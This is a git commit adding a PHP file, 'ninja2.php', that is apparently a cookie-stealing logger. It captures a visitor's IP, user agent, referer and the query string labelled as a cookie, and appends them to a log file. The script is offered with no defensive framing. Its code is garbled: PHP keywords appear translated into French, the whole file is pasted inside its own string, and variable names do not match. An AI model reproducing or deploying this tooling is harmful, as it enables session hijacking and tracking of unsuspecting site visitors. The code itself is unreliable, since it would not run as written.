add2ab44f3a7d587bffa9043529fcce8fb906035
Aleass9 <98566887+Aleass9@users.noreply.github.com>
2022-01-27 23:11:20 -0400

    Add files via upload

---
+++ ninja2.php
@@ -0,0 +1,87 @@
+<?php 
+
+fonction GetIP() 
+{ 
+	si (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "inconnu")) 
+		$ip = getenv("HTTP_CLIENT_IP"); 
+	sinon si (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "inconnu")) 
+		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
+	sinon si (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "inconnu")) 
+		$ip = getenv("REMOTE_ADDR"); 
+	sinon si (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "inconnu"))
+		$ip = $_SERVER['REMOTE_ADDR'] ;
+	autre
+		$ip = "inconnu" ;
+	retour($ip);
+}
+
+fonction logData()
+{ 
+	$ipLog="<?php 
+
+fonction GetIP() 
+{ 
+	si (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "inconnu")) 
+		$ip = getenv("HTTP_CLIENT_IP"); 
+	sinon si (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "inconnu")) 
+		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
+	sinon si (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "inconnu")) 
+		$ip = getenv("REMOTE_ADDR"); 
+	sinon si (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "inconnu"))
+		$ip = $_SERVER['REMOTE_ADDR'] ;
+	autre
+		$ip = "inconnu" ;
+	retour($ip);
+}
+
+fonction logData()
+{ 
+	$ipLog="https://github.com/Aleass9/bayaba/blob/0cb59517846f8ebe25123d8830ce254add667491/log.txt" ;
+	$cookie = $_SERVER['QUERY_STRING'] ;
+	$register_globals = (bool) ini_get('register_gobals');
+	si ($register_globals) $ip = getenv('REMOTE_ADDR');
+	sinon $ip = GetIP();
+
+	$rem_port = $_SERVER['REMOTE_PORT'] ;
+	$user_agent = $_SERVER['HTTP_USER_AGENT'] ;
+	$rqst_method = $_SERVER['METHOD'] ;
+	$rem_host = $_SERVER['REMOTE_HOST'] ;
+	$référent = $_SERVER['HTTP_REFERER'] ;
+	$date=date ("l dS de FY h:i:s A");
+	$log=fopen("$ipLog", "a+");
+
+	si (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
+		fputs($log, "IP : $ip | PORT : $rem_port | HOST : $rem_host | Agent : $user_agent | METHOD : $rqst_method | REF : $referer | DATE{ : } $date | COOKIE : $cookie <br> "); 
+	autre
+		fputs($log, "IP : $ip | PORT : $rem_port | HOST : $rem_host | Agent : $user_agent | METHOD : $rqst_method | REF : $referer | DATE : $date | COOKIE : $cookie \n\n" ); 
+	fclose($log); 
+} 
+
+logData(); 
+
+?>
+ " ;
+	$cookie = $_SERVER['QUERY_STRING'] ;
+	$register_globals = (bool) ini_get('register_gobals');
+	si ($register_globals) $ip = getenv('REMOTE_ADDR');
+	sinon $ip = GetIP();
+
+	$rem_port = $_SERVER['REMOTE_PORT'] ;
+	$user_agent = $_SERVER['HTTP_USER_AGENT'] ;
+	$rqst_method = $_SERVER['METHOD'] ;
+	$rem_host = $_SERVER['REMOTE_HOST'] ;
+	$référent = $_SERVER['HTTP_REFERER'] ;
+	$date=date ("l dS de FY h:i:s A");
+	$log=fopen("$ipLog", "a+");
+
+	si (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
+		fputs($log, "IP : $ip | PORT : $rem_port | HOST : $rem_host | Agent : $user_agent | METHOD : $rqst_method | REF : $referer | DATE{ : } $date | COOKIE : $cookie <br> "); 
+	autre
+		fputs($log, "IP : $ip | PORT : $rem_port | HOST : $rem_host | Agent : $user_agent | METHOD : $rqst_method | REF : $referer | DATE : $date | COOKIE : $cookie \n\n" ); 
+	fclose($log); 
+} 
+
+logData(); 
+
+?>
+ 
